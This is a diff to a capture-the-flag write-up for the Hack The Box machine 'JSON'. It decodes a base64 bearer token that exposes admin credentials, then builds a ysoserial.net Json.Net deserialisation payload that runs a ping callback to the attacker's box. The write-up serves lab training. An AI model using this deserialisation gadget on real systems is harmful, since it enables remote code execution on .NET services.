@@ -124,9 +124,55 @@ ftp>
 /CTF/HTB/boxes/JSON# echo -n eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0= | base64 -d
 {"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"User Admin HTB","Rol":"Administrator"}
 ```
-- We get a cookies that has a bunch of Json
+- We get a cookie that has a bunch of Json
 - So lets just forward this request and see what happens. And we get a successful login as admin but there is nothing much we can do.
 
+- Taking a closer look I note the website authenticates the login using the __/api/account__ endpoint and the response is in a JSON format, giving some of the attributes of the user.
+```
+{"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"User Admin HTB","Rol":"Administrator"}
+```
 
-oot@kali:~/CTF/HTB/boxes/JSON# echo -n 'checkoutmysite' | base64
-Y2hlY2tvdXRteXNpdGU=
+- Let’s see the Bearer header sent during the request closely:
+
+```
+Bearer: eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=
+
+```
+- Base64 decoding of the string gives the following output
+
+```
+{"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"User Admin HTB","Rol":"Administrator"}
+
+```
+- This is the same string which is given as a response and the same is then set to be the cookie as OAuth.
+
+- Let’s play with the bearer header and see if it somehow affects the response from the server. For this I simply base64 encode the string **checkoutmysite** to **Y2hlY2tvdXRteXNpdGUK**
+
+![bearer](./screenshots/3_JSON/bearer.png)
+
+- An instant moment of happiness. The server directly processes the string in the bearer token without any validation.
+
+- Lets test this out with a simple callback to our kali box from the server.
+
+- The string **Cannot deserialize Json.Net Object** quickly gave me the direction as to where I need to head. So I downloaded a tool called [
+ysoserial](https://github.com/pwntester/ysoserial.net.git)
+
+- So let's create our first payload which is a simple ping command to test this out. Our payload will look like this:
+
+```console
+
+.\ysoserial.exe -r ObjectDataProvider -f Json.Net -c "ping -n 1 10.10.14.8" -o raw
+
+{
+     '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
+     'MethodName':'Start',
+     'MethodParameters':{
+         ‘$type’:’System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+         ‘$values’:[‘cmd’,’/c ping 10.10.14.8']
+     },
+     ‘ObjectInstance’:{‘$type’:’System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
+}
+
+```
+
+- Lets convert this to **base64** and throw it to  the server and see if we will get a call back.
